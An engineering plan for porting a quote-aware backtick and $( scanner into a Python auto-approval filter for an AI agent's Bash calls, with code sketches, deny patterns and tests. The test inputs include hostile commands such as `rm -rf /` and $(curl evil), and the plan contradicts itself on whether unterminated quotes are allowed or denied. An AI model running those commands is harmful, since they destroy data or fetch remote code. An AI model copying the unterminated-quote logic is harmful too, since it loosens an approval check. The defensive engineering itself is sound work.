---
title: "fix(security): quote-aware metacharacter rejection in tier1.py (claude-pilot-py mirror of permission_pre_classifier.rs)"
type: fix
status: active
date: 2026-05-20
ticket: mika#946
parent_ticket: mika#938
parent_pr: senara-solutions/mika#945
target_repo: claude-pilot-py
target_file: src/claude_pilot/tier1.py
---

# fix(security): quote-aware metacharacter rejection in tier1.py

## Cross-repo note

The ticket is filed on `senara-solutions/mika` (mika#946) because it's a follow-up to the
mika-side fix (mika#938 / PR #945). The actual code change happens entirely in the
`claude-pilot-py` repository at `src/claude_pilot/tier1.py`. The grooming branch lives on
`mika` (where the ticket is); the implementation PR will target `claude-pilot-py`. The
plan committed here documents what the implementer will do in the sibling repo.

## Overview

`claude-pilot-py/src/claude_pilot/tier1.py` is claude-pilot's local fast-path Bash
auto-approval filter. It currently uses two blanket regex patterns in `TIER3_PATTERNS`
to reject `$(` and backticks anywhere in a command (lines 87–88):

```python
re.compile(r"\$\("),                                    # $(...)
re.compile(r"`[^`]*`"),                                 # backticks
```

PR #945 (mika#938) replaced the equivalent blanket-rejection branch in
`crates/mika-agent/src/server/permission_pre_classifier.rs` with a quote-aware
byte-level scanner `contains_unquoted_metacharacter()` that only rejects when the
metacharacters appear OUTSIDE single- or double-quoted regions. This is correct for
the relay's structural pre-classifier because backticks/`$(` inside a quoted message
argument are literal content (markdown briefs, technical prose) and never expand in
the destination process.

The Python tier1.py has the same false-rejection failure mode for the same reason
(markdown briefs containing inline code spans / `$()` text), but ships only the
blanket form. The F5 sentinel comment at `permission_pre_classifier.rs:67-74`
documents this divergence as intentional N=1 deferral; this plan resolves the
divergence by porting the quote-aware logic to the Python side and removes the
divergence note from the sentinel.

## Problem Frame

claude-pilot's `tier1.py` is invoked synchronously inside the `can_use_tool` callback
before any tool call is relayed. When the LLM emits a Bash call whose `command`
string contains a backtick or `$(` anywhere — including inside a quoted message
argument like `mika ask --agent mika-arch "Brief with \`inline code\`"` — tier1
returns `False` and the request is relayed to the external agent for an LLM
classification round-trip. The classifier rationalizes a deny (or accepts) but in
both cases the round-trip is wasteful, latent, and a source of fabrication risk
(the LLM may invent a reason to deny based on the prose content). Quote-aware
scanning collapses this to a structural allow when the metacharacter is literal
content inside a quoted region.

The security boundary remains correct: metacharacters in UNQUOTED regions trigger
real shell substitution at execution time and must continue to deny. Only literal
content inside `"..."` and `'...'` becomes safe to pass.

## Requirements Trace

- **R1.** `tier1.py` exposes a new function `contains_unquoted_metacharacter(command: str) -> bool`
  that mirrors the Rust implementation's quote-aware byte-level walk (POSIX single-quote
  semantics, double-quote escape-pair handling, unterminated-quote conservative-true behavior).
- **R2.** `is_safe_bash_command(command)` returns `False` when the command contains an
  unquoted backtick or unquoted `$(`. The negative-cases test suite is preserved.
- **R3.** `is_safe_bash_command(command)` no longer returns `False` solely because a
  backtick or `$(` appears inside a quoted region. Existing safe-command tests that
  used a markdown brief argument must pass (and we add new ones to cover the canonical
  /mika-ask-arch shape).
- **R4.** POSIX single-quote escape semantics match the Rust scanner: backslash is
  literal inside `'...'`, so `'foo\'` closes at the second `'` and any backtick that
  follows is detected as unquoted (matches `permission_pre_classifier.rs:163-165`
  comment and the Rust test
  `test_unquoted_meta_backslash_in_single_quotes_does_not_escape_close`).
- **R5.** All existing tier1.py tests pass. New tests cover:
  - Backtick inside double-quoted region — allow.
  - `$(` inside double-quoted region — allow.
  - Backtick inside single-quoted region — allow.
  - `$(` inside single-quoted region — allow.
  - Escaped inner quote (`\"`) inside double-quoted region — allow (no false close).
  - POSIX single-quote backslash literal — deny (backtick after `'foo\'` is unquoted).
  - Backtick AFTER a closing quote — deny.
  - Unterminated double-quote with backtick inside — allow (conservative — the
    scanner treats trailing bytes as inside the quote).
  - Mixed quotes (single-quoted region containing a literal `"` and backtick) — allow.
- **R6.** The F5 sentinel comment at
  `crates/mika-agent/src/server/permission_pre_classifier.rs:67-74` is updated to mark
  the divergence as resolved (references mika#946 / the merged PR), and the matching
  comment in `tier1.py` (currently `# $(...)` / `# backticks`) is replaced with a
  pointer to the new function and a tier1-side resolution note.

## Scope Boundaries

- Only `claude-pilot-py/src/claude_pilot/tier1.py` (and its test module
  `claude-pilot-py/tests/test_tier1.py`) carry code changes.
- The mika repo update is limited to the F5 sentinel comment in
  `crates/mika-agent/src/server/permission_pre_classifier.rs` (documentation update —
  no behavior change). The sentinel update lives in the same PR as the Python port
  to keep the cross-language coupling visible in a single review surface.
- `$(`, backtick are the only patterns moved out of `TIER3_PATTERNS`. The other
  TIER3 patterns (`rm -rf`, `git push --force`, `<(`, `>(`, redirect `>`, etc.)
  remain blanket regex by design — they are real dangerous patterns whose blanket
  scope is correct (process substitution, file redirection, force-push) and the
  Rust counterpart does not quote-aware-handle them either.
- The Python compound-command splitter `_split_compound_command` is NOT modified.
  It remains the existing naive regex split — the comment already calls out that
  it's deliberately quote-unaware (line 105-107), and the new metacharacter check
  runs against the whole command before split, so any compound-positioned backtick
  injection is rejected at the top-level check.
- No changes to `is_tier3_dangerous`, `is_safe_git_command`, `is_safe_shell_command`,
  `is_safe_gh_command`, `is_safe_build_command`, `is_within_project`, or `is_tier1_auto_approve`.

### Deferred to Separate Tasks

None. This is a discrete completion of mika#938's deferred half.

## Context & Research

### Relevant Code and Patterns

- **Rust source of truth** (already shipped):
  `mika/crates/mika-agent/src/server/permission_pre_classifier.rs:169-215` —
  `contains_unquoted_metacharacter()`. Tests at lines 850-962.
- **Python current state** (the target of this port):
  - `claude-pilot-py/src/claude_pilot/tier1.py:70-92` — `TIER3_PATTERNS` tuple,
    including the two blanket regex patterns to remove.
  - `claude-pilot-py/src/claude_pilot/tier1.py:95-96` — `is_tier3_dangerous()`
    function (unchanged shape after the patterns are removed).
  - `claude-pilot-py/src/claude_pilot/tier1.py:111-119` — `is_safe_bash_command()`
    where the new check is wired.
- **Existing test fixtures:** `claude-pilot-py/tests/test_tier1.py` —
  the parametrized `test_tier3_denies` list at lines 42-72 currently includes
  ``"echo `whoami`"`` (backtick) as a TIER3 deny. After the port, this test must
  move into a separate parametrized set that asserts "unquoted backtick denies via
  the new `contains_unquoted_metacharacter` check" (still expected to deny — same
  outcome, different code path).

### Institutional Learnings

- **F5 sentinel doctrine** (`permission_pre_classifier.rs:60-74`): tier1.py is the
  canonical source; Rust mirrors. The N=1 codegen threshold is intact. Removing the
  Branch-5 divergence drops the divergence count back to zero — codegen escalation
  remains unnecessary.
- **POSIX single-quote semantics** (mika#938 pass-1 architect review,
  3-way reviewer agreement on `permission_pre_classifier.rs:163-165`): the Rust
  scanner treats backslash as literal inside `'...'`; the Python port MUST match.
  Diverging here would re-introduce a real exploitability gap (an attacker payload
  shaped like `'foo\' \`evil\`` would bypass detection on one side and trip it on
  the other, creating defense-in-depth confusion).
- **claude-pilot's role** (`claude-pilot-py/CLAUDE.md` line 71-72):
  > **Pipeline slash commands bypass relay approval.** The `Skill` tool invocations
  > for `/mika`, `/ce:*`, ... are auto-approved at Tier 1. These are the agent's
  > own orchestration steps — routing them through the relay exposes them to
  > LLM-driven denials that rationalize fabricated rejections.
  This applies equally to `Bash` calls that carry markdown briefs — every blanket
  rejection on a literal-content backtick is a forced relay round-trip and an
  opportunity for the LLM classifier to fabricate.

### External References

None. The port is grounded in the existing Rust implementation and Python codebase.

## Key Technical Decisions

### Decision 1: Mirror the byte-level walk in Python using a character-state machine

**Decision:** Implement `contains_unquoted_metacharacter(command: str) -> bool` as a
character-by-character iteration over the input string, tracking quote state with
an `Optional[str]` variable (`None` / `'` / `"`). Use `len()`, indexing, and an
explicit index counter — no regex.

**Rationale:** The Rust impl is a 47-line byte-state machine that's easy to
translate one-to-one to Python. Regex isn't a fit (quote state is non-regular).
The metacharacters of interest (`'`, `"`, `\\`, `$`, `(`, `` ` ``) are all ASCII;
Python `str` indexing returns single-character strings, which compare to single-char
literals naturally. The algorithm runs in O(n) on the command length, well below
any realistic limit.

**Alternatives considered:**
- A `shlex`-based approach. Rejected: `shlex.split()` raises on unterminated quotes
  (Rust treats this as conservative-true), tokenizes too aggressively, and would
  obscure the intent of "is there an unquoted metacharacter present."
- A more elaborate parser (e.g., bashlex). Rejected: adds a dependency, far heavier
  than needed, and the test surface would diverge from the Rust scanner.

### Decision 2: Place the new check inside `is_safe_bash_command`, before `is_tier3_dangerous`

**Decision:**

```python
def is_safe_bash_command(command: str) -> bool:
    if contains_unquoted_metacharacter(command):
        return False
    if is_tier3_dangerous(command):
        return False
    # ... existing split + sub-command checks
```

**Rationale:** Both checks short-circuit to `False`; ordering doesn't change
semantics. Putting the quote-aware check first makes the intent clearer when
reading the function ("check for the shell-substitution metacharacters first,
then the broader blanket-pattern matches") and mirrors the Rust structure
(branch 5 precedes the TIER3 check in `pre_classify_pilot_event`).

**Alternatives considered:**
- Folding the check into `is_tier3_dangerous` as another precondition. Rejected:
  it would make the function name lie ("is_tier3_dangerous" suggests TIER3
  patterns, not a quote-aware metacharacter walk).
- Placing it after the compound split, per sub-command. Rejected: the split is
  not quote-aware (per the existing comment), so a metacharacter could appear
  in the un-split form but be elided after a wrong split — checking on the raw
  command is safer.

### Decision 3: Remove `$(` and backtick patterns from `TIER3_PATTERNS`

**Decision:** Delete the two lines:

```python
re.compile(r"\$\("),
re.compile(r"`[^`]*`"),
```

from `TIER3_PATTERNS`. Keep all other patterns including `<(`, `>(`, the redirect
pattern, `bash -c`, `sh -c`, `eval`, `xargs`, `find -exec`, etc.

**Rationale:** The two removed patterns are subsumed by the new quote-aware check.
Leaving them in TIER3 would re-introduce the blanket false-rejection. The `<(`
and `>(` patterns (process substitution) remain blanket because:
1. They have no Rust counterpart to match against (Rust's structural pre-classifier
   targets `mika ask` dispatch only; process substitution is irrelevant there).
2. Process substitution is rarely a legitimate inline-content concept (no markdown
   brief contains `<(` as literal text in a way that a stricter check would harm).
3. AC R3 says "matching Rust semantics" for backtick/`$(` specifically; the AC
   doesn't ask for process substitution to be quote-aware.

**Alternatives considered:**
- Move `<(` and `>(` to quote-aware scanning too. Deferred — out of scope per
  the AC. If a future ticket finds a legitimate use case (e.g., a brief that
  happens to contain `<(` as literal markdown), the same pattern can be applied
  then. Filing this as a deferred task is unwarranted at N=0 user-impact.

### Decision 4: Add a tier1-side comment that documents the cross-language coupling

**Decision:** Add a docstring or top-of-function comment to
`contains_unquoted_metacharacter` that explicitly references the Rust mirror, the
ticket (mika#946), and the F5 sentinel doctrine. Update the F5 sentinel comment
in `permission_pre_classifier.rs` to mark the divergence as resolved (replace the
"Branch 5 divergence" paragraph with a "Branch 5: quote-aware on both sides
(mika#946)" note).

**Rationale:** The F5 sentinel cited tier1.py as canonical; tier1.py's new
function MUST cite the Rust counterpart so the coupling is visible from either
direction. The doctrine itself (codegen threshold) is unchanged.

## Implementation Sketch

### File: `claude-pilot-py/src/claude_pilot/tier1.py`

**Step 1.** Add `contains_unquoted_metacharacter` (mirrors
`permission_pre_classifier.rs:169-215`):

```python
def contains_unquoted_metacharacter(command: str) -> bool:
    """Return True if `command` contains an unquoted backtick or unquoted ``$(``.

    Mirrors `contains_unquoted_metacharacter` in
    `crates/mika-agent/src/server/permission_pre_classifier.rs` (mika repo).
    Quote handling follows POSIX semantics:
    - Inside ``"..."`` regions, `\\\"` is an escape pair (skipped atomically).
    - Inside ``'...'`` regions, backslash is literal — `'foo\\'` closes at the
      second ``'`` and any backtick that follows is unquoted.
    - Unterminated quotes: the scanner treats all remaining bytes as inside the
      quote (conservative — falls through to the LLM relay on malformed input).

    See mika#946 (resolution of mika#938 F5 sentinel divergence).
    """
    n = len(command)
    i = 0
    quote_state: str | None = None  # None / "'" / '"'

    while i < n:
        ch = command[i]
        if quote_state is not None:
            # Inside a quoted region — handle escape (double-quoted only) then close.
            if quote_state == '"' and ch == '\\' and i + 1 < n:
                i += 2
                continue
            if ch == quote_state:
                quote_state = None
            i += 1
            continue

        # Unquoted region — open a quote or check for metacharacters.
        if ch == "'" or ch == '"':
            quote_state = ch
            i += 1
            continue
        if ch == "`":
            return True
        if ch == "$" and i + 1 < n and command[i + 1] == "(":
            return True
        i += 1

    return False
```

**Step 2.** Remove the two retired patterns from `TIER3_PATTERNS`:

```python
TIER3_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"rm\s+(-\w*r\w*f|-\w*f\w*r)\b"),
    re.compile(r"git\s+push\s+.*--force\b"),
    # ... rest unchanged ...
    # REMOVED: r"\$\("  — replaced by contains_unquoted_metacharacter()
    # REMOVED: r"`[^`]*`"  — replaced by contains_unquoted_metacharacter()
    re.compile(r"<\("),
    re.compile(r">\("),
    re.compile(r"(?:^|[^<])>{1,2}(?!\()"),
)
```

**Step 3.** Wire the new check into `is_safe_bash_command`:

```python
def is_safe_bash_command(command: str) -> bool:
    if contains_unquoted_metacharacter(command):
        return False
    if is_tier3_dangerous(command):
        return False

    sub_commands = _split_compound_command(command)
    if not sub_commands:
        return False
    return all(_is_safe_sub_command(sub) for sub in sub_commands)
```

**Step 4.** Update the file header comment block to note the quote-aware scanner
and link to the Rust mirror.

### File: `claude-pilot-py/tests/test_tier1.py`

**Step 5.** Move ``"echo `whoami`"`` (currently in `test_tier3_denies`) into a new
test class or parametrized block dedicated to the quote-aware scanner. Keep the
deny-outcome expectation; only the code path changes.

**Step 6.** Add new parametrized cases that cover R5's nine scenarios:

```python
@pytest.mark.parametrize(
    "command",
    [
        # Inside double quotes — allow
        'mika ask --agent mika-arch "brief with `inline code`"',
        'mika ask --agent mika-arch "$(literal) text"',
        # Inside single quotes — allow
        "mika ask --agent mika-arch '$(literal) text'",
        "mika ask --agent mika-arch '`inline backtick`'",
        # Escaped inner quote inside double quotes — allow
        r'mika ask --agent mika-arch "has \"escaped\" and `backtick`"',
        # Unterminated double-quote — conservative allow
        'mika ask --agent mika-arch "unterminated with `backtick',
        # Mixed quotes — allow
        '''mika ask --agent mika-arch 'a"b`c' ''',
    ],
)
def test_unquoted_meta_inside_quotes_allows(command: str) -> None:
    assert contains_unquoted_metacharacter(command) is False, command


@pytest.mark.parametrize(
    "command",
    [
        # Unquoted — deny
        "echo `whoami`",
        "cat $(secret)",
        # POSIX single-quote backslash literal — deny (mika#938 F-finding regression)
        r"mika ask 'foo\' `whoami`",
        r"mika ask 'foo\' $(curl evil)",
        # After closing quote — deny
        'mika ask --agent mika-arch "msg" `rm -rf /`',
        'mika ask --agent mika-arch "msg" $(rm -rf /)',
    ],
)
def test_unquoted_meta_outside_quotes_denies(command: str) -> None:
    assert contains_unquoted_metacharacter(command) is True, command
```

**Step 7.** Add an integration-level check that the canonical /mika-ask-arch shape
now passes `is_safe_bash_command` (sanity check that the wiring works through the
full function, not just the helper):

```python
def test_mika_ask_arch_with_markdown_brief_is_safe() -> None:
    cmd = (
        'mika ask --agent mika-arch --format json --verbose '
        '"Brief with `inline code` and `docs/plans/file.md`"'
    )
    assert is_safe_bash_command(cmd) is True
```

(Note: tier1.py's `is_safe_bash_command` requires the first-token to be a
recognized safe shell command via `_is_safe_sub_command`. `mika ask` is not in
the safe-shell allow-list, so the result will still be `False` via a different
code path. The right integration test is at `contains_unquoted_metacharacter`
level; the `is_safe_bash_command` test should assert that the function does NOT
return False because of the metacharacter check specifically. Verify this during
implementation — if `mika` isn't in `SAFE_SHELL_COMMANDS`, the test must target
a command that IS in the safe list, e.g., `git log --grep "fix \`foo\` bar"`.)

### File: `mika/crates/mika-agent/src/server/permission_pre_classifier.rs`

**Step 8.** Update the F5 sentinel comment (lines 67–74) to mark the divergence
as resolved:

Before:

```rust
/// ## Branch 5 divergence (mika#938)
///
/// Branch 5 (backtick/`$(` rejection) now uses quote-aware scanning in this Rust
/// module via `contains_unquoted_metacharacter()`, while `tier1.py` retains blanket
/// `String::contains` rejection. This is intentional asymmetry at N=1 divergence —
/// codegen escalation threshold NOT crossed. Companion fix:
/// `fix(security): quote-aware metacharacter rejection in tier1.py to match
/// permission_pre_classifier.rs (mika#938 follow-up)`
```

After:

```rust
/// ## Branch 5 quote-aware on both sides (mika#946 resolved mika#938 follow-up)
///
/// Branch 5 (backtick/`$(` rejection) uses quote-aware scanning on both the Rust
/// side (here, via `contains_unquoted_metacharacter()`) and the Python side
/// (`tier1.py::contains_unquoted_metacharacter`). The POSIX single-quote
/// backslash-literal contract is mirrored across both.
```

This is the only mika-repo change — pure documentation, no behavior change.

## Test Plan

Run from `claude-pilot-py/` worktree:

```bash
uv run pytest tests/test_tier1.py -v
uv run ruff check
uv run mypy src
```

All existing tests must continue to pass. New tests (R5 scenarios) must pass.
The `test_tier3_denies` block must continue to assert the deny outcome for
``"echo `whoami`"`` (either via the new check or via the moved location).

Manual verification: dispatch a representative /mika-ask-arch invocation through
claude-pilot with a brief that contains backticks (e.g., the
`/mika-groom-ticket` pass-1 brief). Confirm via claude-pilot's stderr log that
the Bash tool short-circuit-allows at tier1 rather than relaying to the external
agent. Compare against the same command pre-fix to confirm the saved round-trip.

## Risks and Mitigations

- **Risk:** Behavior divergence between the Rust and Python scanners introduced
  by a subtle translation error (e.g., off-by-one on the escape skip).
  **Mitigation:** Ports must include a side-by-side cross-check table where each
  Rust test fixture from `permission_pre_classifier.rs` lines 850-962 has a
  Python equivalent. The reviewer's checklist includes "every Rust test for
  `contains_unquoted_metacharacter` has a Python sibling with the same input
  string and the same expected outcome." This is the same shape as the F1 mandatory
  fixture from mika#938 (escaped inner quote) — it must continue to behave
  identically across both implementations.

- **Risk:** A test in `test_tier1.py` that previously relied on backtick-in-quoted
  being denied (catching a legitimate dangerous payload by accident) is removed
  too liberally.
  **Mitigation:** Audit `test_tier1.py` for every backtick / `$(` occurrence
  before changing tests. Each one must be classified as either (a) legitimate
  unquoted deny — keep as deny via the new check, or (b) blanket-rejection
  false positive — flip to allow via the quote-aware check. Document the
  reclassification in the PR description.

- **Risk:** The compound-command splitter `_split_compound_command` interacts
  oddly with the new check — e.g., a backtick inside a quoted string straddling
  a compound boundary.
  **Mitigation:** The new check runs against the WHOLE pre-split command. Any
  metacharacter at the top level is detected before the split happens. After
  the check passes (no unquoted metacharacter), the split is safe even if
  quote-unaware — quoted regions cannot contain a real `&&`/`;`/`|` because
  the shell wouldn't parse it that way. (This is the same invariant the existing
  code relies on; not new.)

- **Risk:** Cross-repo coordination — the Python PR merges before the mika
  comment update, leaving the F5 sentinel temporarily inaccurate.
  **Mitigation:** Ship the F5 sentinel update in the SAME PR conceptually,
  but since this PR targets claude-pilot-py while the sentinel is in mika, use
  a paired PR pattern. The mika comment-only PR can land in either order
  without affecting behavior; the PR descriptions cross-reference each other
  via "Companion PR: senara-solutions/<other>#<n>".

## Sequence

1. Implementer creates a worktree on `claude-pilot-py` at the same branch slug
   (`fix/946/security-quote-aware-metacharacter`).
2. Apply Steps 1-4 (tier1.py changes) and Steps 5-7 (test changes) in that
   worktree. Commit. Run pytest + ruff + mypy locally.
3. Open the claude-pilot-py PR. Reference mika#946 in the body.
4. In parallel, apply Step 8 (F5 sentinel comment) in the existing mika worktree
   for branch `fix/946/security-quote-aware-metacharacter`. Commit. Open the
   companion mika PR. Cross-reference the claude-pilot-py PR.
5. Both PRs merge independently; behavior change ships when the claude-pilot-py
   PR merges and `make deploy` reinstalls claude-pilot on PATH.

## Open Questions

None. The Rust source-of-truth is shipped and stable; the port is mechanical
and the tests are derived from the existing Rust fixture set.
